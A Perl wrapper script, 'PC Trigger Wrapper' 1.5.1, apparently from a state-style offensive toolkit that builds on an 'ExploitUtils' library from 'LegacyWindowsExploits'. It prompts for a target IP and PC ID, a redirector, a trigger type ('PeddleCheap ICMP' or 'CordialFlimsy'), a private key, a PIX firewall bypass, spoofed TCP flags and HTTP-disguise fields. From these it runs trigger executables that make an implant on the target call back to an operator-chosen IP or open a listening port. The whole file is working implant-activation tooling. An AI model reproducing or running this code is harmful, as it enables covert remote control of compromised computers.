
use strict;

use vars qw($VERSION);

$::VERSION = "PC Trigger Wrapper: Version 1.5.1";
print "$::VERSION\n\n";

use FindBin;				
use lib "$FindBin::Bin";	
use Getopt::Long;			
use Cwd;					

use lib "$FindBin::Bin\\..\\..\\..\\..\\LegacyWindowsExploits\\Resources\\Perl";
use ExploitUtils qw(
	$EU_LOGFILE
	$EU_VERBOSE
	$EU_BATCHMODE
	EU_LogInit
	EU_Log
	EU_ExitMessage
	EU_GetChoice
	EU_GetInput
	EU_GetExistingDir
	EU_GetIP
	EU_GetLocalIP
	EU_GetRootDir
	EU_GetPort
	EU_RunCommand
	EU_GetAddr
);


use vars qw($REGPROBE $RIDEAREA $PAYLOAD $CIEXE $RPCTOUCH @DEPFILES);


my	%opts = ();
GetOptions(\%opts, "v", "h", "q|?", "b", "e=s", "d=s", "t=s", "c=s") or &print_script_usage(0);

if (scalar(@ARGV) > 0 ) {
  &EU_Log(1, "Extraneous arguments found on command line: @ARGV");
  &EU_Log(1, "Arguments will be ingnored");
  while(@ARGV) {shift;}
}

if (!defined($opts{"e"})) {
	&EU_Log(1, "A -e option must be supplied.");
	&print_usage(0);
}
		
$::SEND_PC_TRIGGER	= "Resources\\PC\\Tools\\SendPCTrigger.exe";
$::SEND_DD_TRIGGER	= "Resources\\PC\\Tools\\SendDDTrigger.exe";

@DEPFILES = ($::SEND_PC_TRIGGER, $::SEND_DD_TRIGGER);

my	$work_dir	= "E:\\";					
my	$root_dir	= "$FindBin::Bin\\..\\..";	

my	$logfile_prefix		= "pctrigger_";			
my	$logfile_suffix		= "_script.log";	

my	$TargetIp		= 0;

&print_usage(1) if (defined $opts{"h"});	
&print_usage(0) if (defined $opts{"q"});	

$ExploitUtils::EU_VERBOSE   = 1 if (defined $opts{"v"});	
$ExploitUtils::EU_BATCHMODE = 1 if (defined $opts{"b"});	

$work_dir       = $opts{"d"} if (defined $opts{"d"});
$root_dir       = $opts{"c"} if (defined $opts{"c"});
$TargetIp       = $opts{"t"} if (defined $opts{"t"});

if ($ENV{"OS"} ne "Windows_NT") {
    &EU_ExitMessage(1,"This script requires Windows NT or Windows 2000");
}

$work_dir = &EU_GetExistingDir("Enter pathname for operation's working directory", $work_dir, 1);
$root_dir = &EU_GetRootDir($root_dir,@::DEPFILES);

&EU_LogInit($logfile_prefix, $logfile_suffix, $work_dir);
&EU_Log(0,"$::VERSION");

&EU_Log(0,"\nChanging to working directory: $work_dir");
chdir $work_dir || &EU_ExitMessage(1,"Unable to change to working directory: $work_dir");

my $cmd = &validate_parms($root_dir, $TargetIp);

my $cur_dir = cwd();

my $answer;
if(!$EU_BATCHMODE) {
	$answer = &EU_GetInput("\nReady to send trigger ([y],n,quit)? ", "y");
	&EU_ExitMessage(0,"User terminated script")  if ($answer ne "y" and $answer ne "Y");
}

&EU_Log(1, "Running command: $cmd");
&EU_RunCommand($cmd);

chdir $cur_dir || &EU_ExitMessage(1,"Unable to switch back to initial directory: $cur_dir");

&EU_ExitMessage(0,"\nDone with $::0.");


sub print_usage() {
	my ($verbose) = @_;
	print "$::VERSION\n";

	print qq~
Usage: $::0 [-v] [-h] [-?] [-b]
             [-d <working directory>] [-e <exploits directory>]
             [-t <target IP>] 
	 
~;

	if ($verbose) {
		print qq~

  -v                    verbose mode. Default non-verbose mode.

  -h                    Print this help information.

  -?                    Print abbreviated help information.

  -b                    Batch (non-interactive) mode. Default interactive mode.

  -d <working directory> Working Directory
                        Top-level directory where operation\'s files will be
                        generated. Default E:\.

  -e <exploits directory> Exploits Directory
                        Top-level directory containing exploit files.
                        Default one directory up from directory containing this script.

  -t <target IP>        Target IP address.
                        Default derived as last part of working directory name.

~;
	}

	&EU_ExitMessage(1,"End of help.");
}

sub validate_parms() {
	my ($root_dir, $TargetIp) = @_;
	my ($cmd, $args);
	while (1) {
		$cmd = "";
		$args = "";
		
		my $redirectFlag;
		my $retcode = &EU_GetInput("\nWill this operation be REDIRECTED (y,[n])? ", "n");
		if( ($retcode eq "y") or ($retcode eq "Y") ) {	$redirectFlag = 1;	}
		else {	$redirectFlag = 0;	}
	
		$TargetIp = &EU_GetIP("\nEnter the Target's IP address", $TargetIp);
		my $finalDestIp = &EU_GetIP("\nEnter the final destination IP address", $TargetIp);
		my $LocalIp = &EU_GetLocalIP("Enter the Local IP address", undef);		
		my $SourceIp = &EU_GetIP("\nEnter the Source IP address", $LocalIp);
		$args = $args . " -sourceaddress $SourceIp";
		
		my $TargetId;
		while (!defined($TargetId)) {
			my $id = &EU_GetInput("\nEnter the Target's PC ID: ", "");
			if ($id =~ /^(0x){0,1}[0-9]+$/) {
				$TargetId = $id;
			} else {
				&EU_Log(1, "\nThe given ID must be number\n");
			}
		}
		$args = $args . " -id $TargetId";
		
		my ($RedirectIp, $RedirectPort);
		if ($redirectFlag == 1) {
			$RedirectIp = &EU_GetIP("\nEnter the Redirection IP address", "127.0.0.1");
			$RedirectPort = &EU_GetPort("\nEnter the Redirection port");
			$args = $args . " -redirect $RedirectIp $RedirectPort";
		}

		my @triggerChoices = (
			{name => "PeddleCheap ICMP"},
			{name => "CordialFlimsy"});
		my $pTriggerChoice = &EU_GetChoice("Pick the trigger type", 2, @triggerChoices);
		if ($pTriggerChoice == undef) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		
		my @protoChoices = (
			{name => "icmp",
			 default0 => 8,
			 default1 => 0
			 },
			{name => "tcp",
			 default0 => 0,
			 default1 => 80
			 },
			 {name => "udp",
			 default0 => 0,
			 default1 => 53
			 });
		my @firewallChoices = (
			{name => "NONE",
			 args => ""},
			{name => "PIX",
			 args => " -firewall pix"}
			);
			
		my @formatChoices = (
			{name => "NONE",
			 args => ""}
			);
		my $callback;
		if ($$pTriggerChoice{name} eq "PeddleCheap ICMP") {
			$callback = 1;
		} else {
			my @actionChoices = (
				{name => "Callback"},
				{name => "Listen"});
			my $pActionChoice = &EU_GetChoice("Pick the trigger action", 1, @actionChoices);
			if ($pActionChoice == undef) {
				&EU_ExitMessage(1,"User terminated script\n");
			}
			
			if ($$pActionChoice{name} eq "Callback") {
				$callback = 1;
			} else {
				$callback = 0;
			}
		}
		
		my $actionIp;
		my $actionSrcPort;
		my $actionDstPort;
		my $actionTime;
		if ($callback) {
			$actionIp = &EU_GetIP("\nEnter the CALLBACK IP address", $LocalIp);
			$actionSrcPort = &EU_GetPort("\nEnter the callback source port", 0);
			$actionDstPort = &EU_GetPort("\nEnter the callback destination port", 0);
			$args = $args . " -callback $actionIp $actionDstPort $actionSrcPort";
		} else {
			$actionIp = &EU_GetIP("\nEnter the LISTEN bind address", "0.0.0.0");
			$actionSrcPort = &EU_GetPort("\nEnter the LISTEN port", 1934);
			$actionTime = &EU_GetPort("\nEnter the LISTEN time (in seconds)", 0);
			$args = $args . " -listen $actionIp $actionSrcPort $actionTime";
		}
		
		my $pChoice;
		my $pFirewallChoice;
		my ($timestamp, $tcpConnect, $sendTo, $sendFrom, $tcpFlags);
		my ($pFormatChoice, $webpage, $action, $domain, $userAgent);
		if ($$pTriggerChoice{name} eq "PeddleCheap ICMP") {
			$pChoice = $protoChoices[0];
			$cmd = $::SEND_PC_TRIGGER;
		
		} else {
			$cmd = $::SEND_DD_TRIGGER;
			$pChoice = &EU_GetChoice("Pick the trigger type", 2, @protoChoices);
			if ($pChoice == undef) {
				&EU_ExitMessage(1,"User terminated script\n");
			}
			$args = $args . " -protocol $$pChoice{name}";
			
			# get keyfile for encryption
			my $keyFile = "$root_dir\\Resources\\PC\\Keys\\Default\\private_key.bin";
			$keyFile = &EU_GetInput("Enter the private key location [$keyFile]: ", $keyFile);
			$args = $args . " -keyfile \"$keyFile\"";
			
			# get timestamp
			my $val;
			if ($TargetId == 0) {
				# timestamp must be given
				$val = "y";
			} else {
				$val = &EU_GetInput("Timestamp the trigger packet ([y],n,quit)? ", "y");
			}
			if (($val eq "y") || ($val eq "Y")) {
				while (1) {
					my ($sec,$min,$hour,$mday,$mon,$year,$extra) = gmtime();
					my $currentTime = sprintf("%02u/%02u/%04u %02u:%02u:%02u", $mon+1, $mday, $year+1900, $hour, $min, $sec);
					$timestamp = &EU_GetInput("Enter timestamp [$currentTime]: ", "$currentTime");
					if ($timestamp =~ /^[0-9]{1,2}\/[0-9]{1,2}\/[0-9]{4} [0-9]{1,2}:[0-9]{1,2}:[0-9]{1,2}$/) {
						last;
					} else {
						&EU_Log(1, "Given timestamp is invalid ($timestamp)\n");
					}
				}
				
				$args = $args . " -timestamp \"$timestamp\"";
			}
			
			# firewall bypass
			$pFirewallChoice = &EU_GetChoice("Pick the firewall bypass type", 1, @firewallChoices);
			if ($pFirewallChoice == undef) {
				&EU_ExitMessage(1,"User terminated script\n");
			}
			$args = $args . $$pFirewallChoice{args};
				
			# tcp connect
			if ($$pChoice{name} eq "tcp") {
				$val = &EU_GetInput("Perform a full TCP connection (y,[n])? ", "n");
				push @formatChoices, { name => "Http", args => " -format Http"};

				if (($val eq "y") || ($val eq "Y")) {
					$tcpConnect = "YES";
					$args = $args . " -tcpconnect";
					push @formatChoices, { name => "SendMail", args => " -format sendmail"};
				} else {
					$tcpConnect = "NO";
					
					# change tcp flags
					while ($tcpFlags == undef) {
						$val = &EU_GetInput("Enter comma seperated TCP flags [ack] : ", "ack");
						if ($val =~ /^((syn|fin|rst|push|ack|urg),)*(syn|fin|rst|push|ack|urg){1}$/) {
							$tcpFlags = $val;
							$args = $args . " -tcpflags $tcpFlags";
							last;
						} else {
							&EU_Log(1, "Invalid tcp flags (valid flags include: syn, fin, rst, push, ack, urg)");
						}
					}
				}
			}
			
			$pFormatChoice = &EU_GetChoice("Pick the packet format", 1, @formatChoices);
			if($pFormatChoice == undef) {
				&EU_ExitMessage(1,"User terminated script\n");
			}
			$args = $args . $$pFormatChoice{args};
			
			
			if(lc $$pFormatChoice{name} eq "http") {
				$userAgent = "Mozilla 4.0 (compatible)";
				$domain;
				$webpage   = "/";
				
				my @actionChoices = (
					{name => "Get Action",
					 args => " -action GET"},
					{name => "Post Action",
					 args => " -action POST"}
				);
				
				$userAgent = &EU_GetInput("Enter the user-agent [$userAgent] : ", $userAgent);
				while (!defined($domain)) {
					my $td = &EU_GetInput("Enter the domain : ", "");
					if(!($td eq "")) {
						$domain = $td;
					}
				}
				$webpage   = &EU_GetInput("Enter the webpage [$webpage] : ", $webpage);
				
				if($webpage =~ /^[^\/].*$/ && $domain =~ /^.*[^\/]$/) {
					$webpage = "/$webpage";
				}
				
				my $pActionChoice = &EU_GetChoice("Pick the HTTP action", 1, @actionChoices);
				if($pActionChoice == undef) {
					&EU_ExitMessage(1, "User terminated script\n");
				}
				$args = $args . $$pActionChoice{args} . " -useragent \"$userAgent\" -domain \"$domain\" -webpage \"$webpage\"";
				$action = $$pActionChoice{name};
			}
			
			# send-addresses
			$val = &EU_GetInput("Provide send-to/send-from addresses (y,[n])? ", "n");
			if (($val eq "y") || ($val eq "Y")) {
				$sendTo = &EU_GetInput("Provide send-to address : ", "");
				$sendFrom = &EU_GetInput("Provide send-from address : ", "");
				$args = $args . " -send-addresses \"$sendTo\" \"$sendFrom\"";
			}	
		}
		
		if ($$pChoice{name} eq "icmp") {
			$$pChoice{default0} = &EU_GetPort("\nEnter the ICMP type", $$pChoice{default0});
			$$pChoice{default1} = &EU_GetPort("\nEnter the ICMP code", $$pChoice{default1});
			
			if ($$pTriggerChoice{name} eq "PeddleCheap ICMP") {
				$args = $args . " -target $TargetIp $finalDestIp -icmp-options $$pChoice{default0} $$pChoice{default1}";
			} else {
				$args = $args . " -target $TargetIp -icmp-options $$pChoice{default0} $$pChoice{default1} -destIp $finalDestIp";
			}

		} else {
			$$pChoice{default0} = &EU_GetPort("\nEnter the source port", $$pChoice{default0});
			$$pChoice{default1} = &EU_GetPort("\nEnter the destination port", $$pChoice{default1});
			
			$args = $args . " -target $TargetIp $$pChoice{default1} $$pChoice{default0} -destIp $finalDestIp";
		}

		&EU_Log(1,"\nConfirm Network Parameters:\n");
		&EU_Log(1,"Root Directory      : $root_dir");
		if( $redirectFlag ) {
			&EU_Log(1,"Using Redirection   : True");
			&EU_Log(1,"Redirector IP       : $RedirectIp");
			&EU_Log(1,"Redirector Port     : $RedirectPort");
		} else {
			&EU_Log(1,"Using Redirection   : False");
		}
		
		&EU_Log(1,"Target IP           : $TargetIp");
		&EU_Log(1,"Protocol            : $$pChoice{name}");
		&EU_Log(1,"Source IP           : $SourceIp");
		if ($callback) {
			&EU_Log(1,"Callback IP         : $actionIp");
			&EU_Log(1,"Callback Src Port   : $actionSrcPort");
			&EU_Log(1,"Callback Dst Port   : $actionDstPort");
		} else {
			&EU_Log(1,"Listen bind IP      : $actionIp");
			&EU_Log(1,"Listen Port         : $actionSrcPort");
			&EU_Log(1,"Listen Time         : $actionTime");
		}
		&EU_Log(1,"Type                : $$pTriggerChoice{name} ($$pChoice{name})");
		if ($$pChoice{name} eq "icmp") {
			&EU_Log(1,"ICMP type           : $$pChoice{default0}");
			&EU_Log(1,"ICMP code           : $$pChoice{default1}");
		} else {
			&EU_Log(1,"Target Src Port     : $$pChoice{default0}");
			&EU_Log(1,"Target Dst Port     : $$pChoice{default1}");
		}
		&EU_Log(1,"Target ID           : $TargetId");
		if (defined($timestamp)) {
			&EU_Log(1,"Timestamp           : $timestamp");
		}
		if (defined($pFirewallChoice)) {
			&EU_Log(1,"Firewall Bypass     : $$pFirewallChoice{name}");
		}
		if (defined($tcpConnect)) {
			&EU_Log(1,"Full TCP Connection : $tcpConnect");
		}
		if (defined($tcpFlags)) {
			&EU_Log(1,"TCP flags           : $tcpFlags");
		}
		if (defined($sendTo) && defined($sendFrom)) {
			&EU_Log(1,"Send-To Address     : $sendTo");
			&EU_Log(1,"Send-From Address   : $sendFrom");
		}
		if (defined($pFormatChoice)) {
			&EU_Log(1,"Format              : " . $$pFormatChoice{name});
		}
		if (defined($action) && defined($webpage) && defined($userAgent) && defined($domain)) {
			&EU_Log(1,"Action              : $action");
			&EU_Log(1,"Domain              : $domain");
			&EU_Log(1,"Webpage             : $webpage");
			&EU_Log(1,"User-Agent          : $userAgent");
		}

		my $okay = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $okay");

		if( ($okay eq "quit") or ($okay eq "QUIT") or ($okay eq "q") or ($okay eq "Q") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		elsif( ($okay eq "n") or ($okay eq "N") ) {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}
		elsif( ($okay eq "y") or ($okay eq "Y") ) {
			last;
		} 
	} 

	return ("\"$root_dir\\$cmd\"" . $args);
}

__END__



